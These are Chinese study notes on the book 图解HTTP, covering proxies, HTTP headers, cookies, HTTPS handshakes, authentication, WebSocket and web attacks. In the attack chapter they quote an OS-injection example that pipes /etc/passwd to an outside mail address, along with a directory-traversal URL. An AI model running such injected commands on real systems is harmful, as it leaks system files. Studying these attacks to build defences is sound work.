图解HTTP 读书笔记

第五章

代理是一种由转发功能的应用程序，扮演了位于服务器和客户端中间人的角色，接收由客户端发送的请求并转发给服务器，同时也接收服务器返回的响应并转发给客户端

网关是转发其他服务器通信数据的服务器，接收从客户端发送来的请求时，它就像自己拥有资源的源服务器对请求进行处理

隧道是在相隔甚远的客户端和服务器两者之间进行中转，并保持双方通信连接的应用程序


每次通过代理服务器转发请求或响应时，会追加写入 Via 首部信息
使用代理服务器的理由有： 
利用缓存技术减少网络带宽的流量，
组织内部针对特定网站的访问控制

缓存代理：预先将资源的副本保存在代理服务器上，当代理再次接收到对相同资源的请求时，就可以不从源服务器那里获取资源

透明代理：转发请求或响应，不对报文做任何加工的代理类型被称为透代理。

网关能使通信线路上的服务器提供非 HTTP 协议服务，能提高通信的安全性，因为可以在客户端与网关之间的通信线路上加密以确保连接的安全。比如网关连接数据库，使用 SQL 语句查询数据，另外在 Web 购物网站上进行信用卡结算时，网关可以和信用卡结算系统联动


隧道可按要求建立起一条与其他服务器的通信线路，届时使用 SSL 等加密手段进行通信，确保客户端能与服务器进行安全的通信，隧道本身不会去解析 HTTP 请求，请求保持原样中转给之后的服务器。可以和远距离的服务器安全通信


第六章
HTTP 首部

HTTP 请求报文

HTTP 响应报文

使用首部字段是为了给浏览器和服务器提供报文主体大小、所使用的语言、认证信息等内容

通用首部字段
Cache-Control 控制缓存的行为
Connection 逐跳首部、连接的管理  （逐跳首部）
Date 创建报文的日期时间
Pragma 报文指令
Trailer 报文末端的首部一栏 （逐跳首部）
Transfer-Encoding 指定报文主体的传输编码方式 （逐跳首部）
Upgrade 升级为其他协议 （逐跳首部）
Via 代理服务器的相关信息
Warning 错误通知

请求首部字段

Accept 用户代理可处理的媒体类型
Accept-Charset 优先的字符集
Accept-Encoding 优先的内容编码
Accept-Language 优先的语言
Authorization Web 认证信息
Expect 期待服务器的特定行为
From 用户的电子邮箱地址
Host 请求资源所在服务器
If-Match 比较实体标记（ETag）
If-Modified-Since 比较资源的更新时间
If-None-Match 比较实体标记（与 If-Match 相反）
If-Range 资源未更新时发送实体 Byte 的范围请求
If-Unmodified-Since 比较资源的更新时间
Max-Forwards 最大传输逐跳数
Proxy-Authorization 代理服务器要求客户端的认证信息 （逐跳首部）
Range 实体的字节范围请求
Referer 对请求中的 URI 的原始获取方
TE 传输编码的优先级 （逐跳首部）
User-Agent HTTP 客户端程序的信息

响应首部字段

Accept-Ranges 是否接受字节范围请求 
Age 推算资源创建经过时间
ETag 资源的匹配信息
Location 令客户端重定向至指定 URI
Proxy-Authenticate 代理服务器对客户端的认证信息 （逐跳首部）
Retry-After 对再次发起请求的时机要求
Server HTTP 服务器的安装信息
Vary 代理服务器缓存的管理信息
WWW-Authenticate 服务器对客户端的认证信息

实体首部字段

Allow 资源可支持的HTTP方法
Content-Encoding 实体主体适用的编码方式
Content-Language 实体主体的自然语言
Content-Length 实体主体的大小
Content-Location 替代对应资源的 URI
Content-MD5 实体主体的报文摘要
Content-Range 实体主体的位置范围
Content-Type 实体主体的媒体类型
Expires 实体主体过期的日期时间
Last-Modified 资源的最后修改日期

非 HTTP/1.1 首部字段
Cookie、Set-Cookie、Content-Disposition


Cache-Control: no-cache 

no-cache 不缓存过期的资源
no-store 真正不进行缓存

max-age 单位：秒，缓存资源的缓存时间数值比指定的时间数值更小，那么客户端就接收缓存的资源

min-fresh 单位：秒

Connection 
控制不再转发给代理的首部字段（逐跳首部对应的八个字段）
管理持久连接

Date 表明创建 HTTP 报文的日期和时间

Pragma 要求所有中间的服务器不返回缓存的资源（遗留字段）

强E-Tag 和 弱 E-Tag
强 E-Tag 不论实体发生多么细微的变化都会改变其值
弱 E-Tag 只用于提示资源是否相同，只有资源发生了根本改变，才会改变 ETag值，会在字段值最开始处附加 W/

Set-Cookie

Set-Cookie: status=enable; expires=Tue, 05, Jul 2011 07:36:21 GMT; path=/; domain=.hackr.jp;

Set-Cookie 字段的属性 
NAME=VALUE 赋予 Cookie 的名称和其值
expires=DATE Cookie 的有效期 若不明确指定则默认为浏览器关闭为止
path=PATH 将服务器上的文件目录作为 Cookie 的适用对象
domain=域名 作为 Cookie 适用对象的域名（若不指定则默认为创建 Cookie 的服务器的域名）
Secure 仅在 HTTPS 安全通信时才会发送 Cookie
HttpOnly 加以限制，使 Cookie 不能被 JavaScript 脚本访问

其他首部字段
X-Frame-Options 防止点击劫持
X-XSS-Protection 控制浏览器XSS防护机制的开关
DNT 意为拒绝个人信息被收集
P3P 


第七章 HTTPS

HTTP的不足
1. 通信使用明文，内容可能会被窃听
2. 不验证通信方的身份，因此有可能遭遇伪装
3. 无法验证报文的完整性，所以有可能已篡改

与SSL组合使用的HTTP被称为 HTTPS (超文本传输安全协议)
内容的加密，客户端和服务器同时具备加密和解密机制，

HTTP 协议不确认通信方，会存在以下各种隐患
1. 无法确定请求发送至目标的服务器是否是按真实意图返回响应的那台服务器，有可能是已伪装的服务器
2. 无法确定响应返回到的客户端是否是按真实意图接收响应的那个客户端，有可能是伪装的客户端
3. 无法确定正在通信的对方是否具备访问权限，因为某些web服务器上保存着重要信息，只想发给特定用户通信的权限
4. 无法判定请求是来自何方、出自谁手
5. 无意义的请求也会接收，无法阻止海量请求下的 DoS 攻击（Denial of Service, 拒绝服务攻击）

查明对手的证书
证书由值得信任的第三方机构颁发，用以证明服务器和客户端是实际存在的
使用证书，减少了个人信息泄露的危险性
另外，客户端持有证书即可完成个人身份的确认，也可用于对 Web 网站的认证环节

无法证明报文的完整性，可能已遭篡改
请求或响应在传输途中，遭攻击者拦截并篡改内容的攻击称为中间人攻击（Man-in-the-Middle attack， MITM）

防止篡改
常用MD5 和 SHA-1 等散列值校验的方法，用来确认文件的数字签名方法

HTTP + 加密 + 认证 + 完整性保护 = HTTPS

HTTPS 并非是应用层（四层分别是：应用层，传输层，网络层，链路层）的一种新协议，只是 HTTP 通信接口部分用 SSL 和 TLS 协议代替而已

SSL 是当今世界上应用最为广泛的网络安全技术

使用两把密钥的公开密钥加密——非对称加密

使用公开密钥加密方式，发送密文的一方使用对方的公钥进行加密，对方收到被加密的信息后，使用自己的私有密钥进行解密，利用这种方式，不需要发送用来解密的私有密钥，也不必担心密钥被攻击者窃听而盗走，另外，根据密文和公钥进行解密是极其困难的，解密过程就是对离散对数进行求值，这非常难办到。这也是比特币的加密方式

HTTPS 采用混合加密机制

HTTPS 采用共享密钥加密和公开密钥加密两者并用的缓和加密机制。公钥加密处理比共享密钥加密方式更为复杂，因此先使用公钥加密方式安全交换共享密钥后，确保交换的密钥安全后，使用共享密钥加密方式进行通信

证明公开密钥正确性的证书

多数浏览器开发商发布版本时，会事先在内部植入常用认证机关的公开密钥

HTTPS 的安全通信机制

步骤1 客户端发送 Client Hello 报文开始 SSL 通信，报文中包含客户端支持的 SSL 的指定版本、加密组件列表（所使用的加密算法及密钥长度等）
步骤2 服务器可进行 SSL 通信时，会以Server Hello 报文作为应答，和客户端一样，在报文中包含 SSL版本及加密组件。服务器的加密组件内容是从接收到的客户端加密组件内筛选出来的
步骤3 服务器发送 Certificate 报文，报文中包含公开密钥证书
步骤4 最后服务器发送 Server Hello Done 报文通知客户端，最初阶段的 SSL 握手协商部分结束

步骤5 SSL 第一次握手结束之后，客户端以 Client Key Exchange 报文作为回应，报文中包含通信加密中使用的一种被称为 Pre-master secret 的随机密码串，该报文已使用步骤 3 中的公开密钥加密
步骤6 接着客户端继续发送 Change Cipher Spec 报文，该报文会提示服务器，在此报文后的通信会采用 Pre-master secret 密钥加密
步骤7 客户端发送 finish 报文，该报文包含连接至今全部报文的整体校验值。这次握手协商是否能成功，要以服务器是否能够正确解密该报文作为判定标准
步骤8 服务器同样发送 Change Cipher Spec 报文
步骤9 服务器同样发送 finish 报文
步骤10 服务器和客户端的 finish 报文交换完毕之后，SSL 连接就算建立完成，当然，通信会受到 SSL 保护，从此处开始进行应用层协议的通信，即发送 HTTP 请求
步骤11 应用层协议通信，即发送 HTTP 响应
步骤12 最后由客户端断开连接，断开连接时，发送 close_notify 报文。


SSL 的慢分两种，一种是通信慢，一种是大量消耗 CPU 及内存导致处理速度变慢

和使用HTTP 想比，网络负载可能会变慢 2 到 100 倍，除去和TCP连接、发送 HTTP 请求，响应以外，还必须进行 SSL 通信，整体上处理通信量不可避免会增加
另一点是 SSL 必须进行加密处理，会更多消耗硬件资源，导致负载增强
可以使用 SSL 加速器，提高数倍 SSL 的计算速度

非敏感信息使用 HTTP 通信，敏感信息使用 HTTPS 加密通信
节约资源同时节约购买证书的开销


第八章
确认访问用户身份的认证

HTTP 使用的认证方式

BASIC 认证 基本认证 不常用
DIGEST 认证 摘要认证 
SSL 客户端认证
FormBase 认证 基于表单认证 各自实现，比较常用，但问题也比较多

Session 管理及 Cookie 应用

1. 客户端发送已登录信息(ID，密码等放入报文的实体部分，通常是以POST方法) -->  服务器
2. 服务器向用户发放 Session ID，记录认证状态，发送包含 Session ID 的 Cookie Set-Cookie PHPSESSIONID=03232131ac --> 客户端
SessionID 有效期管理，保证其安全性，另外建议在 Cookie 内加上 httponly 属性
3. 服务器通过验证Session Id 来判定对方是真实用户  发送 Session ID 的 Cookie: PHPSESSIONID=03232131ac


第九章
基于 HTTP 的功能追加协议

- 一条连接上只可发送一个请求
- 请求只能从客户端开始，客户端不可以接受除响应以外的指令
- 请求/响应首部未经压缩就发送，首部信息越多延迟越大
- 发送冗长的首部，每次互相发送相同的首部造成的浪费较多
- 可任意选择数据压缩格式，非强制压缩发送


Ajax 的解决方案

Comet 的解决方案

SPDY 的设计与功能
考虑安全性问题，SPDY规定通信中使用 SSL

功能：
多路复用流 单一的TCP连接，可以无限制处理多个HTTP请求
赋予请求优先级 给请求逐个分配优先级顺序
压缩HTTP首部 压缩 HTTP 请求和响应的首部
推动功能 支持服务器主动向客户端推送数据的功能
服务器提示功能 服务器可以主动提示客户端请求所需的资源，如果资源已缓存，就可以避免请求

使用浏览器进行全双工通信的 WebSocket

WebSocket 即 Web 浏览器与 Web 服务器之间全双工通信标准
一旦 Web 服务器与客户端之间建立起 Websocket 协议的通信连接，之后所有通信都依靠这个专用协议进行，通信过程可互相发送JSON、XML、HTML 或图片等任意格式的数据

- 推送功能
- 减少通信量

需要在 HTTP 连接建立后，完成一次握手步骤
为了实现 WebSocket 通信，需要用到 HTTP 的 Upgrade 首部字段，告知服务器通信协议发生改变

握手·请求

GET /chat HTTP/1.1

Host: server.example.com
Upgrade: websocket
Connection: Upgrade
Sec-Websocket-Key: dghdjhdkashdaskj== // 握手过程中必不可少的键值
Origin: http://example.com
Sec-Websocket-Protocol: chat, superchat  // 记录使用的子协议
Sec-Websocket-Version: 13

握手·响应

HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-Websocket-Accept: dadsadsghfgddsadsadsa==
Sec-Websocket-Protocol: chat

成功握手确立 Websocket 连接后，通信时不再使用 HTTP 数据帧，采用 Websocket 独立的数据帧

```js
var socket = new WebSocket('ws://game.example.com:12010/updates');
socket.onopen = function() {
    setInterval(function() {
        if (socket.bufferedAmount == 0){
            socket.send(getUpdateData())
        }
    }, 50)
}

```

HTTP2.0 7项技术及讨论

压缩              SPDY、Friendly
多路复用          SPDY
TLS 义务化        Speed + Mobility
协商              Speed + Mobility， Friendly
客户端拉拽（Client Pull）
服务器推送（Server Push） Speed + Mobility
浏览控制          SPDY
Websocket        Speed + Mobility

HTTP Speed + Mobility 简写为 Speed + Mobility
Network-Friendly HTTP Upgrade 简写为 Friendly

HTTP协议受众广泛
互联网上，使用率最高的当属web，构建web服务器或者访问 web站点，需事先设置防火墙http(80/tcp)和HTTPS（443/tcp）的权限
许多公司或组织已设定权限将HTTP作为通信环境，无须再修改防火墙的设定。

第十章
构建web内容的技术

第十一章 Web 的攻击技术

在HTTP 请求报文内加载攻击代码，就能发起对web应用的攻击，通过URL查询字段或表单，HTTP首部、Cookie 等途径把攻击代码传入，若这时web应用存在安全漏洞，那内部信息就会遭到窃取，或被攻击者拿到管理权限。

主动攻击
被动攻击


主动攻击是指攻击者通过直接访问web应用，把攻击代码传入的攻击模式，由于该模式是直接针对服务器上的资源进行攻击，因此攻击者需要能够访问到那些资源

被动攻击是指利用圈套策略执行攻击代码的攻击模式，在被动攻击过程中，攻击者不直接对目标web应用访问发起攻击 ——跨站脚本攻击和跨站点请求伪造

Web 应用的安全对策可大致分为以下两部分
1. 客户端的验证
2. web 应用端（服务器端）的验证
输入值验证
输出值转义

XSS 攻击，一般是闭合掉可执行代码标签的属性后补充上script标签

SQL 注入攻击
非法查看或篡改数据库内的数据
规避认证
执行和数据库服务器业务关联的程序等

SQL 注入

是攻击者将SQL语句改变成开发者意想不到的形式达到破坏结构的攻击

OS注入攻击

`open(MAIL, "| /usr/sbin/sendmail ; cat /etc/passwd | mail hack@example.jp");`

HTTP 首部注入攻击

攻击者输入 %0D%0A 经过解析之后， %0D%0A 变成了换行符，结果插入了新的首部字段

目录遍历攻击

http://example.com/read/php?log=../../etc/passwd

开放重定向

会话劫持
会话劫持是指攻击者通过某种手段拿到了用户的会话ID，并非法使用此会话id伪装成用户，达到攻击的目的

跨站点请求伪造CSRF

密码破解

1. 通过网络密码试错 （穷举法、字典攻击）
2. 对已加密密码的破解

从加密过的数据中导出明文通常有几种方法

1. 穷举法·字典攻击进行类推
2. 彩虹表
3. 拿到密钥
4. 加密算法的漏洞

http://www.freerainbowtables.com/en/tables2/

点击劫持

DoS 攻击

后门程序
1. 开发阶段作为debug调用的后门程序
2. 为了自身利益植入的后门程序
3. 攻击者通过某种方法设置的后门程序